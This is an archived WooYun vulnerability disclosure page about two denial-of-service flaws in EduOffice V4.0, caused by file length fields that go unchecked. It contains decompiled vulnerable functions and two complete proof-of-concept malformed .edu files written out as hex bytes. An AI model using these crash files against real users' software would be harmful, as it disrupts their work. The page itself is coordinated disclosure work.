<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		EduOffice易用办公软件V4.0拒绝服务漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		EduOffice易用办公软件V4.0拒绝服务漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cssembly">cssembly</a> 
</li><li>提交时间：		2013-05-29 18:47</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-05-29：	细节已通知厂商并且等待厂商处理中<br/>
									2013-06-02：	厂商已经确认，细节仅向厂商公开<br/>
									2013-06-05：	细节向第三方安全合作伙伴开放<br/>
									2013-06-12：	细节向核心白帽子及相关领域专家公开<br/>
									2013-06-22：	细节向普通白帽子公开<br/>
									2013-07-12：	细节向实习白帽子公开<br/>
									2013-08-27：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">手工fuzz了一下EduOffice易用办公软件V4.0，发现在处理图片时，由于未校验数据长度，导致拒绝服务</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">通过软件生成一个正常的.edu文件，在文件内容中增加图片资源并保存，用二进制编辑器打开保存后的文件，查找图片在文件中位置，通过修改图片数据之前的二进制数据，手工构造畸形数据。运行软件加载构造的畸形文件，引起拒绝服务。<br />
<br />
漏洞在EduBrowser401U.ocx模块中，具体函数如下<br />
<br />
</p><pre><code>int __thiscall sub_18DC880(void *this, void *a2, time_t Time)<br />
{<br />
  int v3; // esi@1<br />
  void *v4; // edi@1<br />
  char *v5; // ebx@1<br />
  int v6; // eax@2<br />
  int v7; // ecx@2<br />
  int v8; // eax@3<br />
  int v9; // eax@4<br />
  unsigned int v10; // ecx@4<br />
  int *v11; // eax@6<br />
  DWORD v12; // edi@6<br />
  HGLOBAL v13; // ebp@6<br />
  int v15; // [sp-4h] [bp-40h]@2<br />
  const WCHAR *v16; // [sp+10h] [bp-2Ch]@4<br />
  int v17; // [sp+14h] [bp-28h]@1<br />
  char v18; // [sp+18h] [bp-24h]@1<br />
  int *v19; // [sp+1Ch] [bp-20h]@4<br />
  char v20; // [sp+20h] [bp-1Ch]@6<br />
  int v21; // [sp+38h] [bp-4h]@1<br />
<br />
  v3 = (int)a2;<br />
  v4 = this;<br />
  v5 = (char *)this + 4;<br />
  sub_199F078((int)a2, (void **)this + 1);<br />
  sub_18DDE80(v3, Time);<br />
  sub_1889730(&amp;v18);<br />
  v21 = 0;<br />
  sub_1889670(&amp;v17);<br />
  a2 = off_1A0CE74;<br />
  LOBYTE(v21) = 2;<br />
  if ( sub_18DE5B0((char *)v4 + 8) )<br />
  {<br />
    time(&amp;Time);<br />
    v6 = *(_DWORD *)v5;<br />
    v15 = Time;<br />
    sub_19940DF((int)&amp;a2, (size_t)L&quot;Audio%s-%ld&quot;, v6);<br />
  }<br />
  else<br />
  {<br />
    v8 = *(_DWORD *)v5;<br />
    v15 = v17;<br />
    sub_19940DF((int)&amp;a2, (size_t)L&quot;Edu%s-%s&quot;, v8);<br />
  }<br />
  v15 = v7;<br />
  v19 = &amp;v15;<br />
  sub_1995453(&amp;a2);<br />
  sub_18DE560(v15);<br />
  sub_18DCD00(&amp;v16);<br />
  LOBYTE(v21) = 3;<br />
  sub_199A3ED(v16, 36865);<br />
  v9 = *(_DWORD *)(v3 + 36);<br />
  v10 = *(_DWORD *)(v3 + 40);<br />
  LOBYTE(v21) = 4;<br />
  if ( v9 + 4 &gt; v10 )<br />
    sub_199F490(v3, v9 - v10 + 4);<br />
  v11 = *(int **)(v3 + 0x24);<br />
  v15 = *v11;<br />
  v12 = v15;<br />
  *(_DWORD *)(v3 + 36) = v11 + 1;<br />
  v13 = GlobalAlloc(0x40u, v15);<br />
  sub_199F275(v3, v13, v12);<br />
  sub_199A6A1(v13, v12);<br />
  GlobalFree(v13);<br />
  sub_199A765(&amp;v20);<br />
  LOBYTE(v21) = 3;<br />
  sub_199A48D(&amp;v20);<br />
  LOBYTE(v21) = 2;<br />
  sub_19956E6(&amp;v16);<br />
  LOBYTE(v21) = 1;<br />
  sub_19956E6(&amp;a2);<br />
  LOBYTE(v21) = 0;<br />
  sub_19956E6(&amp;v17);<br />
  v21 = -1;<br />
  return sub_19956E6(&amp;v18);<br />
}</code></pre><p class='detail'><br />
<br />
其中v11 = *(int **)(v3 + 0x24);赋值完成后，v11指向从文件中读取的数据缓冲区，通过v15 = *v11取出数据，此处并未校验长度，当v15较大时，会导致 GlobalAlloc(0x40u, v15);函数分配内存失败，而程序并未进行校验，导致在sub_199F275函数中进行数据拷贝时出现异常。<br />
<br />
<br />
<br />
另一处漏洞存在于<br />
<br />
</p><pre><code>int __thiscall sub_18C8630(void *this, int a1)<br />
{<br />
  void *v2; // edi@1<br />
  int v3; // eax@1<br />
  unsigned int v4; // ecx@1<br />
  int v5; // eax@3<br />
  int v6; // ebx@3<br />
  int result; // eax@3<br />
  int Dst; // [sp+Ch] [bp-8h]@4<br />
  int v9; // [sp+10h] [bp-4h]@4<br />
<br />
  v2 = this;<br />
  sub_18C84A0();<br />
  v3 = *(_DWORD *)(a1 + 36);<br />
  v4 = *(_DWORD *)(a1 + 40);<br />
  if ( v3 + 4 &gt; v4 )<br />
    sub_199F490(a1, v3 - v4 + 4);<br />
  v5 = *(_DWORD *)(a1 + 36);<br />
  v6 = *(_DWORD *)v5;<br />
  result = v5 + 4;<br />
  *(_DWORD *)(a1 + 36) = result;<br />
  if ( v6 &gt; 0 )<br />
  {<br />
    do<br />
    {<br />
      sub_199F275(a1, &amp;Dst, 8u);<br />
      result = sub_18C83A0(v2, Dst, v9);<br />
      --v6;<br />
    }<br />
    while ( v6 );<br />
  }<br />
  return result;<br />
}</code></pre><p class='detail'><br />
<br />
<br />
<br />
同样的v5 = *(_DWORD *)(a1 + 36)指向从文件中读取的数据，而v6 = *(_DWORD *)v5取出数据后并未做校验，直接当做while循环计数，而sub_18C83A0函数中每一轮都会申请空间，导致程序大量消耗资源。 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">漏洞1的poc.edu文件内容如下<br />
<br />
</p><pre><code>0x45, 0x44, 0x55, 0x4F, 0x46, 0x46, 0x49, 0x43,<br />
    0x45, 0x2D, 0x47, 0x42, 0x00, 0x00, 0x00, 0x00,<br />
    0x04, 0x00, 0x01, 0x00, 0x34, 0x54, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,<br />
    0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x24, 0x30, 0x00,<br />
    0x62, 0x00, 0x39, 0x00, 0x63, 0x00, 0x35, 0x00,<br />
    0x65, 0x00, 0x36, 0x00, 0x62, 0x00, 0x2D, 0x00,<br />
    0x63, 0x00, 0x66, 0x00, 0x33, 0x00, 0x63, 0x00,<br />
    0x2D, 0x00, 0x34, 0x00, 0x63, 0x00, 0x63, 0x00,<br />
    0x39, 0x00, 0x2D, 0x00, 0x61, 0x00, 0x31, 0x00,<br />
    0x38, 0x00, 0x33, 0x00, 0x2D, 0x00, 0x34, 0x00,<br />
    0x61, 0x00, 0x63, 0x00, 0x32, 0x00, 0x33, 0x00,<br />
    0x37, 0x00, 0x37, 0x00, 0x61, 0x00, 0x62, 0x00,<br />
    0x36, 0x00, 0x32, 0x00, 0x35, 0x00, 0xD2, 0xA9,<br />
    0xCE, 0x4F, 0x40, 0xF3, 0x21, 0x41, 0x52, 0x47,<br />
    0x01, 0x00, 0x12, 0x00, 0x00, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x4C, 0x45, 0x00, 0x64, 0x00, 0x75, 0x00,<br />
    0x30, 0x00, 0x62, 0x00, 0x39, 0x00, 0x63, 0x00,<br />
    0x35, 0x00, 0x65, 0x00, 0x36, 0x00, 0x62, 0x00,<br />
    0x2D, 0x00, 0x63, 0x00, 0x66, 0x00, 0x33, 0x00,<br />
    0x63, 0x00, 0x2D, 0x00, 0x34, 0x00, 0x63, 0x00,<br />
    0x63, 0x00, 0x39, 0x00, 0x2D, 0x00, 0x61, 0x00,<br />
    0x31, 0x00, 0x38, 0x00, 0x33, 0x00, 0x2D, 0x00,<br />
    0x34, 0x00, 0x61, 0x00, 0x63, 0x00, 0x32, 0x00,<br />
    0x33, 0x00, 0x37, 0x00, 0x37, 0x00, 0x61, 0x00,<br />
    0x62, 0x00, 0x36, 0x00, 0x32, 0x00, 0x35, 0x00,<br />
    0x2D, 0x00, 0x34, 0x00, 0x36, 0x00, 0x61, 0x00,<br />
    0x64, 0x00, 0x66, 0x00, 0x62, 0x00, 0x66, 0x00,<br />
    0x62, 0x00, 0x2D, 0x00, 0x31, 0x00, 0x62, 0x00,<br />
    0x35, 0x00, 0x34, 0x00, 0x2D, 0x00, 0x34, 0x00,<br />
    0x33, 0x00, 0x39, 0x00, 0x36, 0x00, 0x2D, 0x00,<br />
    0x39, 0x00, 0x38, 0x00, 0x32, 0x00, 0x64, 0x00,<br />
    0x2D, 0x00, 0x32, 0x00, 0x30, 0x00, 0x65, 0x00,<br />
    0x63, 0x00, 0x31, 0x00, 0x35, 0x00, 0x33, 0x00,<br />
    0x66, 0x00, 0x64, 0x00, 0x32, 0x00, 0x34, 0x00,<br />
    0x31, 0x00, 0xFF, 0xFE, 0xFF, 0x04, 0x2E, 0x00,<br />
    0x6A, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x83,<br />
    0xA1, 0x92, 0x74, 0xFF, 0xFF, 0xFF, 0xFF, 0x00 <br />
<br />
漏洞2的poc2.edu内容如下：<br />
    0x45, 0x44, 0x55, 0x4F, 0x46, 0x46, 0x49, 0x43,<br />
    0x45, 0x2D, 0x47, 0x42, 0x00, 0x00, 0x00, 0x00,<br />
    0x04, 0x00, 0x01, 0x00, 0x4F, 0x01, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x0F, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00,<br />
    0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x4E, 0x00,<br />
    0x65, 0x00, 0x77, 0x00, 0x20, 0x00, 0x52, 0x00,<br />
    0x6F, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00,<br />
    0xD2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,<br />
    0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF,<br />
    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x1F, 0x01,<br />
    0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x14, 0x00,<br />
    0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x14, 0x00,<br />
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,<br />
    0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x0F, 0x54, 0x00,<br />
    0x69, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x73, 0x00,<br />
    0x20, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x77, 0x00,<br />
    0x20, 0x00, 0x52, 0x00, 0x6F, 0x00, 0x6D, 0x00,<br />
    0x61, 0x00, 0x6E, 0x00, 0xB4, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x0F, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00,<br />
    0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x4E, 0x00,<br />
    0x65, 0x00, 0x77, 0x00, 0x20, 0x00, 0x52, 0x00,<br />
    0x6F, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00,<br />
    0xB4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x00, 0xFF, 0xFE, 0xFF, 0x00, 0xFF, 0xFE,<br />
    0xFF, 0x0F, 0x54, 0x00, 0x69, 0x00, 0x6D, 0x00,<br />
    0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x4E, 0x00,<br />
    0x65, 0x00, 0x77, 0x00, 0x20, 0x00, 0x52, 0x00,<br />
    0x6F, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x6E, 0x00,<br />
    0xD2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,<br />
    0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x04, 0x02, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x24,<br />
    0x35, 0x00, 0x61, 0x00, 0x34, 0x00, 0x63, 0x00,<br />
    0x33, 0x00, 0x37, 0x00, 0x62, 0x00, 0x66, 0x00,<br />
    0x2D, 0x00, 0x39, 0x00, 0x38, 0x00, 0x30, 0x00,<br />
    0x61, 0x00, 0x2D, 0x00, 0x34, 0x00, 0x66, 0x00,<br />
    0x32, 0x00, 0x64, 0x00, 0x2D, 0x00, 0x39, 0x00,<br />
    0x61, 0x00, 0x39, 0x00, 0x31, 0x00, 0x2D, 0x00,<br />
    0x65, 0x00, 0x36, 0x00, 0x64, 0x00, 0x39, 0x00,<br />
    0x36, 0x00, 0x64, 0x00, 0x63, 0x00, 0x30, 0x00,<br />
    0x36, 0x00, 0x61, 0x00, 0x31, 0x00, 0x63, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0x24,<br />
    0x35, 0x00, 0x61, 0x00, 0x34, 0x00, 0x63, 0x00,<br />
    0x33, 0x00, 0x37, 0x00, 0x62, 0x00, 0x66, 0x00,<br />
    0x2D, 0x00, 0x39, 0x00, 0x38, 0x00, 0x30, 0x00,<br />
    0x61, 0x00, 0x2D, 0x00, 0x34, 0x00, 0x66, 0x00,<br />
    0x32, 0x00, 0x64, 0x00, 0x2D, 0x00, 0x39, 0x00,<br />
    0x61, 0x00, 0x39, 0x00, 0x31, 0x00, 0x2D, 0x00,<br />
    0x65, 0x00, 0x36, 0x00, 0x64, 0x00, 0x39, 0x00,<br />
    0x36, 0x00, 0x64, 0x00, 0x63, 0x00, 0x30, 0x00,<br />
    0x36, 0x00, 0x61, 0x00, 0x31, 0x00, 0x63, 0x00,<br />
    0xFF, 0xFE, 0xFF, 0x24, 0x35, 0x00, 0x61, 0x00,<br />
    0x34, 0x00, 0x63, 0x00, 0x33, 0x00, 0x37, 0x00,<br />
    0x62, 0x00, 0x66, 0x00, 0x2D, 0x00, 0x39, 0x00,<br />
    0x38, 0x00, 0x30, 0x00, 0x61, 0x00, 0x2D, 0x00,<br />
    0x34, 0x00, 0x66, 0x00, 0x32, 0x00, 0x64, 0x00,<br />
    0x2D, 0x00, 0x39, 0x00, 0x61, 0x00, 0x39, 0x00,<br />
    0x31, 0x00, 0x2D, 0x00, 0x65, 0x00, 0x36, 0x00,<br />
    0x64, 0x00, 0x39, 0x00, 0x36, 0x00, 0x64, 0x00,<br />
    0x63, 0x00, 0x30, 0x00, 0x36, 0x00, 0x61, 0x00,<br />
    0x31, 0x00, 0x63, 0x00, 0x00, 0x01, 0x00, 0x00,<br />
    0x00, 0x11, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF,<br />
    0xFE, 0xFF, 0x24, 0x66, 0x00, 0x30, 0x00, 0x64,<br />
    0x00, 0x39, 0x00, 0x33, 0x00, 0x65, 0x00, 0x32,<br />
    0x00, 0x32, 0x00, 0x2D, 0x00, 0x39, 0x00, 0x34,<br />
    0x00, 0x33, 0x00, 0x61, 0x00, 0x2D, 0x00, 0x34,<br />
    0x00, 0x37, 0x00, 0x61, 0x00, 0x64, 0x00, 0x2D,<br />
    0x00, 0x61, 0x00, 0x65, 0x00, 0x31, 0x00, 0x35,<br />
    0x00, 0x2D, 0x00, 0x62, 0x00, 0x34, 0x00, 0x34,<br />
    0x00, 0x30, 0x00, 0x37, 0x00, 0x37, 0x00, 0x35,<br />
    0x00, 0x39, 0x00, 0x35, 0x00, 0x32, 0x00, 0x38,<br />
    0x00, 0x33, 0x00, 0x04, 0x00, 0x00, 0x00, 0xE8,<br />
    0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x04, 0x02, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x01, 0x00, 0x00, 0x00, 0x16, 0x00, 0x0C,<br />
    0x30, 0xFF, 0xFE, 0xFF, 0x24, 0x36, 0x00, 0x31,<br />
    0x00, 0x65, 0x00, 0x65, 0x00, 0x64, 0x00, 0x31,<br />
    0x00, 0x39, 0x00, 0x32, 0x00, 0x2D, 0x00, 0x34,<br />
    0x00, 0x32, 0x00, 0x32, 0x00, 0x61, 0x00, 0x2D,<br />
    0x00, 0x34, 0x00, 0x62, 0x00, 0x31, 0x00, 0x66,<br />
    0x00, 0x2D, 0x00, 0x39, 0x00, 0x36, 0x00, 0x38,<br />
    0x00, 0x62, 0x00, 0x2D, 0x00, 0x34, 0x00, 0x35,<br />
    0x00, 0x35, 0x00, 0x33, 0x00, 0x38, 0x00, 0x66,<br />
    0x00, 0x31, 0x00, 0x35, 0x00, 0x34, 0x00, 0x37,<br />
    0x00, 0x64, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br />
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x30,<br />
    0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,<br />
    0xFF, 0xFF, 0xFF, 0x7F</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/1023364764000c1f8ff3a2e14d0b95c986dd76bf.png" target="_blank"><img src="../images/1023364764000c1f8ff3a2e14d0b95c986dd76bf.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
<br />
双击加载第一个文件，程序异常出错<br />
<br />
</p><p class="detail"><a href="../images/102338152829a4ec0bbcf5f2977d6368a7b381d8.png" target="_blank"><img src="../images/102338152829a4ec0bbcf5f2977d6368a7b381d8.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
<br />
双击加载第二个文件，程序大量占用cpu，同时内存不断增加<br />
<br />
</p><p class="detail"><a href="../images/102340009c1314447381f7d8ea4b4a84604708d9.png" target="_blank"><img src="../images/102340009c1314447381f7d8ea4b4a84604708d9.png" alt=".PNG" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cssembly" title="cssembly">cssembly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023470" title="EduOffice易用办公软件V4.0拒绝服务漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：11 </p>
													<p class="detail">确认时间：2013-06-02 23:05</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD对所述情况完成机理分析确认，不过距离溢出还有一段距离，时间关系，对于POC未深入研究，已经留存。已经由CNVD在30日下午直接联系上软件生产厂商（北京洲洋伟业信息技术有限公司），协调其处置。<br />
<br />
按理论上可能存在的溢出进行评分，rank=7.48*1.1*1.3=10.696</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="23470";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
